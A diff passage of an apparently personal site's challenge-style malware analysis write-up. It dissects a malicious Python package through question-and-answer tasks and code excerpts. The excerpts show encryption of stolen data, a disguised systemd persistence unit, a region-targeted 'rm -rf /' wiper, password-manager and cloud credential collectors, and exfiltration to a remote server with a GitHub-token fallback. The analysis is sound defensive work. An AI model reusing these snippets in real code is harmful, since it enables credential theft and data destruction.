+                  <code>entrypoint.py</code> generates a 32-byte session key and a 12-byte
+                  initialization vector:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-12"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-12"><code>    aes_key = os.urandom(32)
+    iv = os.urandom(12)</code></pre>
+                </div>
+                <p>
+                  A 32-byte key contains 256 bits. The implementation in
+                  <code>utilities/crypto.py</code> confirms AES in GCM mode:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >utilities/crypto.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-13"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-13"
+                  ><code>def aes_256_gcm_encrypt(key: bytes, iv: bytes, plaintext: bytes) -&gt; tuple[bytes, bytes]:
     encryptor = Cipher(algorithms.AES(key), modes.GCM(iv)).encryptor()
     ciphertext = encryptor.update(plaintext) + encryptor.finalize()
-    return ciphertext, encryptor.tag</code></pre></div><p>The function returns the ciphertext and its authentication tag.</p></div></details></section><section class="autoit-task" id="task-10"><h2><span class="task-number">Task 10</span> — Session Key Encryption</h2><p class="task-question">What asymmetric scheme, padding and hash algorithm encrypt the AES session key?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>RSA-OAEP-SHA256</code></p><p>The key-wrapping function uses RSA with OAEP padding:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>utilities/crypto.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-14"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-14"><code>def rsa_oaep_encrypt_sha256(pem_pubkey: bytes, plaintext: bytes) -&gt; bytes:
+    return ciphertext, encryptor.tag</code></pre>
+                </div>
+                <p>The function returns the ciphertext and its authentication tag.</p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-10">
+            <h2><span class="task-number">Task 10</span> — Session Key Encryption</h2>
+            <p class="task-question">
+              What asymmetric scheme, padding and hash algorithm encrypt the AES session key?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>RSA-OAEP-SHA256</code></p>
+                <p>The key-wrapping function uses RSA with OAEP padding:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >utilities/crypto.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-14"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-14"
+                  ><code>def rsa_oaep_encrypt_sha256(pem_pubkey: bytes, plaintext: bytes) -&gt; bytes:
     public_key = load_pem_public_key(pem_pubkey)
     return public_key.encrypt(
         plaintext,
@@ -24,24 +555,383 @@ _TARGET_URL = &quot;https://83.142.209.194/v1/weights&quot;</code></pre></div><p
             algorithm=hashes.SHA256(),
             label=None
         )
-    )</code></pre></div><p>SHA-256 is specified for both OAEP and its MGF1 mask generation function. The collected data is encrypted with AES; RSA protects the AES session key.</p></div></details></section><section class="autoit-task" id="task-11"><h2><span class="task-number">Task 11</span> — Systemd Unit Filename</h2><p class="task-question">What is the exact filename of the systemd unit file created by the persistence function?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>pgsql-monitor.service</code></p><p>In <code>roulette.py</code>, <code>deploy_local()</code> constructs the service path:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-15"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-15"><code>    svc_path = os.path.join(svc_dir, &quot;pgsql-monitor.service&quot;)</code></pre></div><p>Root execution uses <code>/etc/systemd/system</code>; non-root execution uses <code>~/.config/systemd/user</code>. The unit describes itself as <strong>PostgreSQL Monitor</strong> and requests automatic restart.</p><p>However, its activation command references an undefined variable:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-16"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-16"><code>        subprocess.run(f&quot;{svc_cmd} enable --now {CONFIG[&#x27;SVC_NAME&#x27;]}&quot;, shell=True)</code></pre></div><p>The supplied module does not define <code>CONFIG</code>. This causes an exception before that command launches, and the exception is silently caught. Writing the service file does not establish successful persistence.</p></div></details></section><section class="autoit-task" id="task-12"><h2><span class="task-number">Task 12</span> — Dropped Python Filename</h2><p class="task-question">What filename is used for the downloaded payload?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>pgmonitor.py</code></p><p>The same function constructs the payload path:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-17"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-17"><code>    bin_path = os.path.join(bin_dir, &quot;pgmonitor.py&quot;)</code></pre></div><p>It decodes the received Base64 data, writes it to that path and attempts to set its permissions:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-18"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-18"><code>        with open(bin_path, &quot;wb&quot;) as f:
+    )</code></pre>
+                </div>
+                <p>
+                  SHA-256 is specified for both OAEP and its MGF1 mask generation function. The
+                  collected data is encrypted with AES; RSA protects the AES session key.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-11">
+            <h2><span class="task-number">Task 11</span> — Systemd Unit Filename</h2>
+            <p class="task-question">
+              What is the exact filename of the systemd unit file created by the persistence
+              function?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer">
+                  <strong>Answer:</strong> <code>pgsql-monitor.service</code>
+                </p>
+                <p>
+                  In <code>roulette.py</code>, <code>deploy_local()</code> constructs the service
+                  path:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-15"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-15"
+                  ><code>    svc_path = os.path.join(svc_dir, &quot;pgsql-monitor.service&quot;)</code></pre>
+                </div>
+                <p>
+                  Root execution uses <code>/etc/systemd/system</code>; non-root execution uses
+                  <code>~/.config/systemd/user</code>. The unit describes itself as
+                  <strong>PostgreSQL Monitor</strong> and requests automatic restart.
+                </p>
+                <p>However, its activation command references an undefined variable:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-16"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-16"
+                  ><code>        subprocess.run(f&quot;{svc_cmd} enable --now {CONFIG[&#x27;SVC_NAME&#x27;]}&quot;, shell=True)</code></pre>
+                </div>
+                <p>
+                  The supplied module does not define <code>CONFIG</code>. This causes an exception
+                  before that command launches, and the exception is silently caught. Writing the
+                  service file does not establish successful persistence.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-12">
+            <h2><span class="task-number">Task 12</span> — Dropped Python Filename</h2>
+            <p class="task-question">What filename is used for the downloaded payload?</p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>pgmonitor.py</code></p>
+                <p>The same function constructs the payload path:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-17"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-17"
+                  ><code>    bin_path = os.path.join(bin_dir, &quot;pgmonitor.py&quot;)</code></pre>
+                </div>
+                <p>
+                  It decodes the received Base64 data, writes it to that path and attempts to set
+                  its permissions:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-18"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-18"><code>        with open(bin_path, &quot;wb&quot;) as f:
             f.write(base64.b64decode(python_b64))
-        os.chmod(bin_path, 0o755)</code></pre></div><p>Root execution uses <code>/usr/bin</code>; non-root execution uses <code>~/.local/bin</code>.</p></div></details></section><section class="autoit-task" id="task-13"><h2><span class="task-number">Task 13</span> — Wiper Die Roll</h2><p class="task-question">What integer must the random die roll match to trigger the wiper branch?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>2</code></p><p>The condition appears in <code>roulette.collect()</code>:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-19"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-19"><code>    roll = random.randint(1, 6)
-    if _is_israeli_system() and roll == 2:</code></pre></div><p>Both conditions must hold: the environment must match the region checks and the random roll must equal two. Despite the helper’s name, the checks include markers associated with both Israel and Iran:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-20"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-20"><code>    _TZ_MARKERS = (&quot;Jerusalem&quot;, &quot;Tel_Aviv&quot;, &quot;Tehran&quot;)
-    _LOCALE_MARKERS = (&quot;he_IL&quot;, &quot;fa_IR&quot;)</code></pre></div></div></details></section><section class="autoit-task" id="task-14"><h2><span class="task-number">Task 14</span> — Destructive Command</h2><p class="task-question">What is the full command string used by the wiper branch?</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>rm -rf /</code></p><p>The source passes the command as an argument list:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-21"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-21"><code>        subprocess.run([&quot;rm&quot;, &quot;-rf&quot;, &quot;/&quot;])</code></pre></div><p>Joining those arguments with spaces gives the requested answer. This is an attempted recursive deletion of the root directory. Its success depends on the execution environment, permissions and the installed <code>rm</code> implementation. Implementations with root-preservation protection can reject this exact invocation.</p></div></details></section><section class="autoit-task" id="task-15"><h2><span class="task-number">Task 15</span> — Password Manager Keys</h2><p class="task-question">List the four dictionary keys returned by collectors/passwords.py, in order.</p><details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p class="task-answer"><strong>Answer:</strong> <code>onepassword,bitwarden,pass,gopass</code></p><p>The return statement preserves the requested order:</p><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>collectors/passwords.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-22"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-22"><code>def collect() -&gt; dict:
+        os.chmod(bin_path, 0o755)</code></pre>
+                </div>
+                <p>
+                  Root execution uses <code>/usr/bin</code>; non-root execution uses
+                  <code>~/.local/bin</code>.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-13">
+            <h2><span class="task-number">Task 13</span> — Wiper Die Roll</h2>
+            <p class="task-question">
+              What integer must the random die roll match to trigger the wiper branch?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>2</code></p>
+                <p>The condition appears in <code>roulette.collect()</code>:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-19"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-19"><code>    roll = random.randint(1, 6)
+    if _is_israeli_system() and roll == 2:</code></pre>
+                </div>
+                <p>
+                  Both conditions must hold: the environment must match the region checks and the
+                  random roll must equal two. Despite the helper’s name, the checks include markers
+                  associated with both Israel and Iran:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-20"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-20"
+                  ><code>    _TZ_MARKERS = (&quot;Jerusalem&quot;, &quot;Tel_Aviv&quot;, &quot;Tehran&quot;)
+    _LOCALE_MARKERS = (&quot;he_IL&quot;, &quot;fa_IR&quot;)</code></pre>
+                </div>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-14">
+            <h2><span class="task-number">Task 14</span> — Destructive Command</h2>
+            <p class="task-question">What is the full command string used by the wiper branch?</p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>rm -rf /</code></p>
+                <p>The source passes the command as an argument list:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>roulette.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-21"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-21"
+                  ><code>        subprocess.run([&quot;rm&quot;, &quot;-rf&quot;, &quot;/&quot;])</code></pre>
+                </div>
+                <p>
+                  Joining those arguments with spaces gives the requested answer. This is an
+                  attempted recursive deletion of the root directory. Its success depends on the
+                  execution environment, permissions and the installed
+                  <code>rm</code> implementation. Implementations with root-preservation protection
+                  can reject this exact invocation.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-15">
+            <h2><span class="task-number">Task 15</span> — Password Manager Keys</h2>
+            <p class="task-question">
+              List the four dictionary keys returned by collectors/passwords.py, in order.
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer">
+                  <strong>Answer:</strong> <code>onepassword,bitwarden,pass,gopass</code>
+                </p>
+                <p>The return statement preserves the requested order:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >collectors/passwords.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-22"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-22"><code>def collect() -&gt; dict:
     return {
         &quot;onepassword&quot;: _collect_onepassword(),
         &quot;bitwarden&quot;:   _collect_bitwarden(),
         &quot;pass&quot;:        _collect_pass(),
         &quot;gopass&quot;:      _collect_gopass(),
-    }</code></pre></div><div class="report-table-wrap"><table class="report-table"><thead><tr><th scope="col">Dictionary key</th><th scope="col">CLI</th></tr></thead><tbody><tr><td><code>onepassword</code></td><td><code>op</code></td></tr><tr><td><code>bitwarden</code></td><td><code>bw</code></td></tr><tr><td><code>pass</code></td><td><code>pass</code></td></tr><tr><td><code>gopass</code></td><td><code>gopass</code></td></tr></tbody></table></div><p>Collection depends on the installed tools and their available authentication state. For example, the Bitwarden collector checks that the vault is unlocked before requesting its items.</p></div></details></section><section id="how-the-package-works"><h2>How the Package Works</h2><h3>1. Filter the environment and require a second run</h3><p><code>__main__.py</code> checks the platform, locale and CPU count. It then uses <code>/tmp/.transformers</code> to separate initial activation from subsequent execution. After the marker check passes, the code ensures that <code>cryptography</code> is available and launches <code>entrypoint</code> while suppressing standard output and errors.</p><details class="answer-spoiler code-disclosure"><summary>View code</summary><div class="answer-content"><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-23"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-23"><code>            with open(os.devnull, &#x27;w&#x27;) as fnull:
+    }</code></pre>
+                </div>
+                <div class="report-table-wrap">
+                  <table class="report-table">
+                    <thead>
+                      <tr>
+                        <th scope="col">Dictionary key</th>
+                        <th scope="col">CLI</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><code>onepassword</code></td>
+                        <td><code>op</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>bitwarden</code></td>
+                        <td><code>bw</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>pass</code></td>
+                        <td><code>pass</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>gopass</code></td>
+                        <td><code>gopass</code></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+                <p>
+                  Collection depends on the installed tools and their available authentication
+                  state. For example, the Bitwarden collector checks that the vault is unlocked
+                  before requesting its items.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section id="how-the-package-works">
+            <h2>How the Package Works</h2>
+            <h3>1. Filter the environment and require a second run</h3>
+            <p>
+              <code>__main__.py</code> checks the platform, locale and CPU count. It then uses
+              <code>/tmp/.transformers</code> to separate initial activation from subsequent
+              execution. After the marker check passes, the code ensures that
+              <code>cryptography</code> is available and launches <code>entrypoint</code> while
+              suppressing standard output and errors.
+            </p>
+            <details class="answer-spoiler code-disclosure">
+              <summary>View code</summary>
+              <div class="answer-content">
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span>__main__.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-23"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-23"
+                  ><code>            with open(os.devnull, &#x27;w&#x27;) as fnull:
                 with redirect_stdout(fnull), redirect_stderr(fnull):
-                    runpy.run_module(&#x27;entrypoint&#x27;, run_name=&#x27;__main__&#x27;)</code></pre></div></div></details><h3>2. Request a secondary payload</h3><p>The entry point first contacts <code>/v1/models</code>. An HTTP 200 response is passed to <code>roulette.collect()</code>, which selects between the conditional destructive branch and local payload deployment. If an exception occurs during this initial stage, the code attempts to resolve a replacement destination through GitHub.</p><details class="answer-spoiler code-disclosure"><summary>View code</summary><div class="answer-content"><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-24"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-24"><code>        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as res:
+                    runpy.run_module(&#x27;entrypoint&#x27;, run_name=&#x27;__main__&#x27;)</code></pre>
+                </div>
+              </div>
+            </details>
+            <h3>2. Request a secondary payload</h3>
+            <p>
+              The entry point first contacts <code>/v1/models</code>. An HTTP 200 response is passed
+              to <code>roulette.collect()</code>, which selects between the conditional destructive
+              branch and local payload deployment. If an exception occurs during this initial stage,
+              the code attempts to resolve a replacement destination through GitHub.
+            </p>
+            <details class="answer-spoiler code-disclosure">
+              <summary>View code</summary>
+              <div class="answer-content">
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-24"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="teampcp-code-24"
+                  ><code>        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as res:
             if res.status == 200:
                 payload_b64 = res.read().decode().strip()
                 roulette.collect(payload_b64)
     except Exception:
-        mothership_url = _resolve_mothership_via_github()</code></pre></div></div></details><h3>3. Run the credential collectors</h3><p><code>aggregate.py</code> discovers modules under <code>collectors/</code> and submits them to a thread pool. Each module’s <code>collect()</code> function contributes to the results dictionary. The package includes collectors for AWS, Azure, GCP, Kubernetes, Vault, local files and password managers.</p><details class="answer-spoiler code-disclosure"><summary>View code</summary><div class="answer-content"><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>aggregate.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-25"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-25"><code>def collect_all() -&gt; dict:
+        mothership_url = _resolve_mothership_via_github()</code></pre>
+                </div>
+              </div>
+            </details>
+            <h3>3. Run the credential collectors</h3>
+            <p>
+              <code>aggregate.py</code> discovers modules under <code>collectors/</code> and submits
+              them to a thread pool. Each module’s <code>collect()</code> function contributes to
+              the results dictionary. The package includes collectors for AWS, Azure, GCP,
+              Kubernetes, Vault, local files and password managers.
+            </p>
+            <details class="answer-spoiler code-disclosure">
+              <summary>View code</summary>
+              <div class="answer-content">
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >aggregate.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-25"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-25"><code>def collect_all() -&gt; dict:
     modules = list(pkgutil.iter_modules(collectors.__path__))
     
     results = {}
@@ -50,7 +940,34 @@ _TARGET_URL = &quot;https://83.142.209.194/v1/weights&quot;</code></pre></div><p
         for future in concurrent.futures.as_completed(futures):
             name, result = future.result()
             results[name] = result
-    return results</code></pre></div></div></details><h3>4. Compress and encrypt the results</h3><p>The results are serialized and gzip-compressed. A fresh AES key encrypts the compressed data, while the embedded RSA public key encrypts the session key. The returned package contains a Base64 envelope and a separately encoded encrypted key.</p><details class="answer-spoiler code-disclosure"><summary>View code</summary><div class="answer-content"><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-26"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-26"><code>def _build_package(data: dict) -&gt; dict:
+    return results</code></pre>
+                </div>
+              </div>
+            </details>
+            <h3>4. Compress and encrypt the results</h3>
+            <p>
+              The results are serialized and gzip-compressed. A fresh AES key encrypts the
+              compressed data, while the embedded RSA public key encrypts the session key. The
+              returned package contains a Base64 envelope and a separately encoded encrypted key.
+            </p>
+            <details class="answer-spoiler code-disclosure">
+              <summary>View code</summary>
+              <div class="answer-content">
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-26"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-26"><code>def _build_package(data: dict) -&gt; dict:
     compressed = gzip.compress(json.dumps(data).encode())
     aes_key = os.urandom(32)
     iv = os.urandom(12)
@@ -59,10 +976,70 @@ _TARGET_URL = &quot;https://83.142.209.194/v1/weights&quot;</code></pre></div><p
     return {
         &quot;envelope&quot;: base64.b64encode(iv + ciphertext + tag).decode(),
         &quot;key&quot;: base64.b64encode(encrypted_key).decode(),
-    }</code></pre></div></div></details><h3>5. Attempt exfiltration, then fall back to GitHub</h3><p>The code first attempts to send the encrypted package to the selected destination. If that fails, it searches the collected results for a GitHub token. A matching token enables a second attempt using a public repository. This branch uploads the original results as JSON through GitHub’s Base64 content field; it does not use the AES-encrypted package.</p><details class="answer-spoiler code-disclosure"><summary>View code</summary><div class="answer-content"><div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>entrypoint.py</span><button class="copy-code" type="button" aria-label="Copy code to clipboard" aria-controls="teampcp-code-27"><span data-copy-label>Copy</span></button></div><pre id="teampcp-code-27"><code>        results = collect_all()
+    }</code></pre>
+                </div>
+              </div>
+            </details>
+            <h3>5. Attempt exfiltration, then fall back to GitHub</h3>
+            <p>
+              The code first attempts to send the encrypted package to the selected destination. If
+              that fails, it searches the collected results for a GitHub token. A matching token
+              enables a second attempt using a public repository. This branch uploads the original
+              results as JSON through GitHub’s Base64 content field; it does not use the
+              AES-encrypted package.
+            </p>
+            <details class="answer-spoiler code-disclosure">
+              <summary>View code</summary>
+              <div class="answer-content">
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title"
+                      ><span class="terminal-glyph" aria-hidden="true">&gt;_</span
+                      >entrypoint.py</span
+                    ><button
+                      class="copy-code"
+                      type="button"
+                      aria-label="Copy code to clipboard"
+                      aria-controls="teampcp-code-27"
+                    >
+                      <span data-copy-label>Copy</span>
+                    </button>
+                  </div>
+                  <pre id="teampcp-code-27"><code>        results = collect_all()
         try:
             _send(results, mothership_url)
         except Exception:
             token = find_github_token(results)
             if token:
-                upload_to_github(token, results)</code></pre></div></div></details><p>The source shows credential theft, multiple exfiltration paths and attempted persistence, alongside a conditional destructive branch. The undefined service configuration and environment-dependent deletion behavior are practical limits when assessing what this particular sample would successfully execute.</p></section></article></div></main><footer class="site-footer"><div class="footer-inner"><p>© 2026 Mehmet Sacit Çınar</p><nav class="footer-nav" aria-label="Footer navigation"><a href="/index.html" data-section="home">About</a><a href="/research.html" data-section="research">Research</a><a href="/projects.html" data-section="projects">Projects</a><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page">Write-ups</a><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a></nav></div></footer><script src="/navigation.js" defer></script><script src="/writeup.js" defer></script></body></html>
+                upload_to_github(token, results)</code></pre>
+                </div>
+              </div>
+            </details>
+            <p>
+              The source shows credential theft, multiple exfiltration paths and attempted
+              persistence, alongside a conditional destructive branch. The undefined service
+              configuration and environment-dependent deletion behavior are practical limits when
+              assessing what this particular sample would successfully execute.
+            </p>
+          </section>
+        </article>
+      </div>
+    </main>
+    <footer class="site-footer">
+      <div class="footer-inner">
+        <p>© 2026 Mehmet Sacit Çınar</p>
+        <nav class="footer-nav" aria-label="Footer navigation">
+          <a href="/index.html" data-section="home">About</a
